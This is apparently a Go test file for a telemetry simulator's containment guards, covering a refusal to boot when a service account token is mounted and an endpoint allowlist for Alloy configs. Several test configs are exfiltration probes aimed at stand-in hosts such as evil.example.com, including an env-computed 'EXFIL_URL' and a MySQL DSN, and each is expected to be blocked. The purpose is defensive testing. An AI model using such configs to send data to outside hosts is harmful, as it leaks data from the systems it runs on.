package simsvc

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"shepherd/internal/simulate"
)

var _ = Describe("Service account token guard", func() {
	// §6.4 lists "no service account token" first among the containment
	// controls. automountServiceAccountToken: false is exactly the kind of pod
	// spec key that gets dropped in a values file with nothing noticing, so the
	// control is expressed as a refusal to boot: loud, and testable without a
	// cluster.
	It("refuses to start when a token is mounted", func() {
		dir := GinkgoT().TempDir()
		token := filepath.Join(dir, "token")
		Expect(os.WriteFile(token, []byte("not-a-real-token"), 0o600)).To(Succeed())

		err := CheckServiceAccountToken(token)
		Expect(err).To(MatchError(ErrServiceAccountToken))
		Expect(err.Error()).To(ContainSubstring("refusing to start"))
		Expect(err.Error()).To(ContainSubstring(token))
	})

	It("starts when no token is mounted", func() {
		Expect(CheckServiceAccountToken(filepath.Join(GinkgoT().TempDir(), "absent"))).To(Succeed())
	})

	It("refuses through Serve, before any listener is bound", func() {
		dir := GinkgoT().TempDir()
		token := filepath.Join(dir, "token")
		Expect(os.WriteFile(token, []byte("not-a-real-token"), 0o600)).To(Succeed())

		cfg := testConfig(dir)
		cfg.SATokenPath = token
		// Port 1 is privileged and would fail to bind; Serve returning the
		// token error rather than a bind error is the proof the guard runs
		// first.
		cfg.Listen = "127.0.0.1:1"
		cfg.CaptureListen = "127.0.0.1:1"

		Expect(Serve(GinkgoT().Context(), cfg, nil)).To(MatchError(ErrServiceAccountToken))
	})
})

var _ = Describe("Endpoint allowlist", func() {
	const allowed = "shepherd-simulator"

	It("rejects a config naming a host the harness does not serve", func() {
		config := fmt.Sprintf(`
prometheus.remote_write "leak" {
  endpoint {
    url = %q
  }
}
`, "https://metrics.example.com/api/v1/write")

		err := CheckEndpoints(config, []string{allowed, "127.0.0.1"})
		Expect(err).To(MatchError(ErrEndpointNotAllowed))
		Expect(err.Error()).To(ContainSubstring("metrics.example.com"))
	})

	It("rejects an httptest server URL, so a run cannot be pointed at a listener inside the test process", func() {
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
			w.WriteHeader(http.StatusOK)
		}))
		DeferCleanup(server.Close)

		config := fmt.Sprintf(`
prometheus.remote_write "leak" {
  endpoint {
    url = %q
  }
}
`, server.URL+simulate.CapturePathPrometheus)

		Expect(CheckEndpoints(config, []string{allowed})).To(MatchError(ErrEndpointNotAllowed))
	})

	It("accepts a config whose destinations all point at the harness", func() {
		config := fmt.Sprintf(`
prometheus.remote_write "cap" {
  endpoint {
    url = %q
  }
}

loki.write "cap" {
  endpoint {
    url = %q
  }
}

otelcol.exporter.otlp "cap" {
  client {
    endpoint = %q
    tls {
      insecure = true
    }
  }
}
`,
			"http://"+allowed+":9110"+simulate.CapturePathPrometheus,
			"http://"+allowed+":9110"+simulate.CapturePathLoki,
			allowed+":4317",
		)

		Expect(CheckEndpoints(config, []string{allowed})).To(Succeed())
	})

	It("rejects a bare host:port outside the allowlist", func() {
		config := `
otelcol.exporter.otlp "leak" {
  client {
    endpoint = "otel.example.com:4317"
  }
}
`
		err := CheckEndpoints(config, []string{allowed})
		Expect(err).To(MatchError(ErrEndpointNotAllowed))
		Expect(err.Error()).To(ContainSubstring("otel.example.com"))
	})

	It("reports a config that does not parse rather than passing it through", func() {
		Expect(CheckEndpoints(`prometheus.remote_write "cap" {`, []string{allowed})).
			To(MatchError(ContainSubstring("invalid_config")))
	})

	// Finding H6's own probe set, verbatim. Five of these were ALLOWED by the
	// allowlist this replaces, and the two marked "control" were already
	// blocked — they are here so a rewrite that lost them fails too, rather
	// than looking like a pure improvement.
	//
	// Every host below is under example.com/example.net by design: the probe
	// must never be able to resolve, let alone connect, if a future change
	// turns this into something that dials.
	DescribeTable("refuses every shape finding H6 proved bypassed the old allowlist",
		func(config string, mustName string) {
			err := CheckEndpoints(config, []string{allowed, "localhost", "127.0.0.1", "::1"})
			Expect(err).To(MatchError(ErrEndpointNotAllowed), "config:\n%s", config)
			Expect(err.Error()).To(ContainSubstring(mustName))
		},
		Entry("bypass 1: bracketed IPv6 host:port",
			"prometheus.scrape \"p\" {\n  targets = [{__address__ = \"[2001:db8::1]:9090\"}]\n  forward_to = []\n}",
			"2001:db8::1"),
		Entry("bypass 2: a bare host name with no port",
			"otelcol.receiver.solace \"p\" {\n  broker = \"broker.evil.example.com\"\n  queue = \"q\"\n  output { }\n}",
			"broker.evil.example.com"),
		Entry("bypass 3: an endpoint the config COMPUTES rather than names",
			`prometheus.remote_write "p" { endpoint { url = sys.env("EXFIL_URL") } }`,
			"sys.env(...)"),
		Entry("bypass 4: a host buried in a MySQL DSN",
			`prometheus.exporter.mysql "p" { data_source_name = "u:p@tcp(db.evil.example.com:3306)/x" }`,
			"db.evil.example.com"),
		Entry("bypass 5: a scheme that is not http(s)",
			`prometheus.remote_write "p" { endpoint { url = "ftp://evil.example.com/x" } }`,
			"evil.example.com"),
		Entry("control: a plain http URL, blocked before and after",
			`prometheus.remote_write "p" { endpoint { url = "http://evil.example.com/api/v1/write" } }`,
			"evil.example.com"),
		Entry("control: a bare host:port, blocked before and after",
			`otelcol.exporter.otlp "p" { client { endpoint = "otel.evil.example.com:4317" } }`,
			"otel.evil.example.com"),
		Entry("string concatenation, which builds a URL out of parts",
			`prometheus.remote_write "p" { endpoint { url = "http://" + sys.env("H") + "/write" } }`,
			"computes value(s)"),
		Entry("a dotted-quad the allowlist does not name",
			`otelcol.exporter.otlp "p" { client { endpoint = "203.0.113.7:4317" } }`,
			"203.0.113.7"),
	)

	// The other half: a deny-by-default gate that refuses the configs the
	// transform actually produces is not a gate, it is an outage. These are the
	// shapes rule K really emits.
	It("accepts a transformed config carrying component references, relabel regexes and fixture paths", func() {
		config := `
discovery.relabel "src" {
  targets = [{__address__ = "simulator:9111", __scheme__ = "http", job = "synthetic"}]
}

prometheus.scrape "app" {
  targets      = discovery.relabel.src.output
  forward_to   = [prometheus.remote_write.cap.receiver]
  job_name     = "app"
  metrics_path = "/metrics"
}

prometheus.relabel "filter" {
  forward_to = [prometheus.remote_write.cap.receiver]
  rule {
    source_labels = ["__name__"]
    regex         = "go_.*"
    action        = "keep"
    target_label  = "team"
  }
}

loki.source.file "logs" {
  targets    = [{__path__ = "/tmp/shepherd-sim/logs/file-logs.log", job = "file-logs"}]
  forward_to = []
}

prometheus.remote_write "cap" {
  endpoint {
    url = "http://shepherd-simulator:9110/capture/prometheus/api/v1/write"
  }
}
`
		Expect(CheckEndpoints(config, []string{allowed, "simulator"})).To(Succeed())
	})

	It("expands a configured allowlist entry that is itself an address, so host:port entries still allow their host", func() {
		config := `otelcol.exporter.otlp "cap" { client { endpoint = "simulator:4317" } }`
		Expect(CheckEndpoints(config, []string{"simulator:4317"})).To(Succeed())
	})

	// B-CONCAT: render.go's refValue (render.go:412-420) emits
	// `array.concat(ref1, ref2, ...)` whenever more than one discovery source
	// fans into one targets-typed input — the ONLY correct rendering since
	// M13, because the list-literal alternative is config `alloy run` refuses
	// (list-of-lists on a []discovery.Target port). Before this carve-out,
	// CheckEndpoints treated every CallExpr as computed, so this exact,
	// legitimate shape was refused outright. These pin the narrow exception:
	// transparent only for `array.concat` whose arguments are ALL pure
	// component references, fail-closed for everything else.
	Describe("the array.concat fan-in carve-out (B-CONCAT)", func() {
		It("accepts array.concat of two pure component references", func() {
			config := `
discovery.relabel "first" {
  targets = [{__address__ = "simulator:9111"}]
}

discovery.relabel "second" {
  targets = [{__address__ = "simulator:9111"}]
}

prometheus.scrape "app" {
  targets    = array.concat(discovery.relabel.first.output, discovery.relabel.second.output)
  forward_to = []
  job_name   = "app"
}
`
			Expect(CheckEndpoints(config, []string{allowed, "simulator"})).To(Succeed())
		})

		// The rejected-shape cases below pin isPureComponentRef's fail-closed
		// default for AST forms the carve-out must never admit. A future edit
		// that widens the reference definition (e.g. allowing IndexExpr to
		// index into a discovery list) must consciously flip one of these,
		// not slip through the default branch untested.
		It("refuses array.concat with an indexed reference argument", func() {
			config := `
discovery.relabel "first" {
  targets = [{__address__ = "simulator:9111"}]
}

prometheus.scrape "app" {
  targets    = array.concat(discovery.relabel.first.output[0])
  forward_to = []
  job_name   = "app"
}
`
			err := CheckEndpoints(config, []string{allowed, "simulator"})
			Expect(err).To(MatchError(ErrEndpointNotAllowed))
		})

		It("refuses array.concat with a parenthesized reference argument", func() {
			config := `
discovery.relabel "first" {
  targets = [{__address__ = "simulator:9111"}]
}

prometheus.scrape "app" {
  targets    = array.concat((discovery.relabel.first.output))
  forward_to = []
  job_name   = "app"
}
`
			err := CheckEndpoints(config, []string{allowed, "simulator"})
			Expect(err).To(MatchError(ErrEndpointNotAllowed))
		})

		It("refuses an empty array.concat()", func() {
			// Deleting the explicit zero-argument early return would make the
			// all-arguments loop pass vacuously; this pins that branch.
			config := `
prometheus.scrape "app" {
  targets    = array.concat()
  forward_to = []
  job_name   = "app"
}
`
			err := CheckEndpoints(config, []string{allowed})
			Expect(err).To(MatchError(ErrEndpointNotAllowed))
		})

		It("refuses array.concat carrying a literal host alongside a reference", func() {
			config := `
discovery.relabel "first" {
  targets = [{__address__ = "simulator:9111"}]
}

prometheus.scrape "app" {
  targets    = array.concat("literal-host:9090", discovery.relabel.first.output)
  forward_to = []
  job_name   = "app"
}
`
			// A literal argument disqualifies the whole call from the
			// carve-out, so it is refused as computed — same as any other
			// call — rather than the literal being separately checked
			// against the allowlist. Fail-closed: the message need only
			// prove the call was refused, not which argument tripped it.
			err := CheckEndpoints(config, []string{allowed, "simulator"})
			Expect(err).To(MatchError(ErrEndpointNotAllowed))
			Expect(err.Error()).To(ContainSubstring("computes value(s)"))
			Expect(err.Error()).To(ContainSubstring("array.concat(...)"))
		})

		It("refuses array.concat wrapped in another call", func() {
			config := `
discovery.relabel "first" {
  targets = [{__address__ = "simulator:9111"}]
}

prometheus.scrape "app" {
  targets    = sneaky(array.concat(discovery.relabel.first.output))
  forward_to = []
  job_name   = "app"
}
`
			err := CheckEndpoints(config, []string{allowed, "simulator"})
			Expect(err).To(MatchError(ErrEndpointNotAllowed))
			Expect(err.Error()).To(ContainSubstring("computes value(s)"))
		})

		It("refuses array.concat with a nested call as an argument", func() {
			config := `
discovery.relabel "first" {
  targets = [{__address__ = "simulator:9111"}]
}

prometheus.scrape "app" {
  targets    = array.concat(other_call(discovery.relabel.first.output))
  forward_to = []
  job_name   = "app"
}
`
			err := CheckEndpoints(config, []string{allowed, "simulator"})
			Expect(err).To(MatchError(ErrEndpointNotAllowed))
			Expect(err.Error()).To(ContainSubstring("computes value(s)"))
		})

		It("refuses a differently-named call over pure references — only array.concat is transparent", func() {
			config := `
discovery.relabel "first" {
  targets = [{__address__ = "simulator:9111"}]
}

discovery.relabel "second" {
  targets = [{__address__ = "simulator:9111"}]
}

prometheus.scrape "app" {
  targets    = array.merge(discovery.relabel.first.output, discovery.relabel.second.output)
  forward_to = []
  job_name   = "app"
}
`
			err := CheckEndpoints(config, []string{allowed, "simulator"})
			Expect(err).To(MatchError(ErrEndpointNotAllowed))
			Expect(err.Error()).To(ContainSubstring("computes value(s)"))
		})
	})
})
